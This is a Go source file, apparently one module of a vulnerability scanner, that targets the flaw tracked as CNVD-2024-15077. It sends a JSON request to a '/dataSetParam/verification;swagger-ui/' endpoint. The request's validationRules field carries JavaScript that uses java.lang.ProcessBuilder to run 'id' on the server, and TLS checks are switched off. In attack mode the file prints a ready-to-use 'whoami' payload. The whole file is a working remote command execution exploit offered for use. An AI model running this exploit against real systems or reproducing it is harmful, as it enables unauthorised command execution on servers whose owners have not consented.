package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func CNVD_2024_15077(url string, Attack bool) error {
	payload := `
{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
`
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/dataSetParam/verification;swagger-ui/", url)

	request, err := http.NewRequest("POST", url1, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "application/json;charset=UTF-8")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body), "操作成功") {
		fmt.Println("[*]CNVD_2024_15077 : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + "请使用POST方法请求/dataSetParam/verification;swagger-ui/，并传入请求体`\n{\"ParamName\":\"\",\"paramDesc\":\"\",\"paramType\":\"\",\"sampleItem\":\"1\",\"mandatory\":true,\"requiredFlag\":1,\"validationRules\":\"function verification(data){a = new java.lang.ProcessBuilder(\\\"whoami\\\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}\"}`\n")
		}
	}

	defer response.Body.Close()

	return nil
}
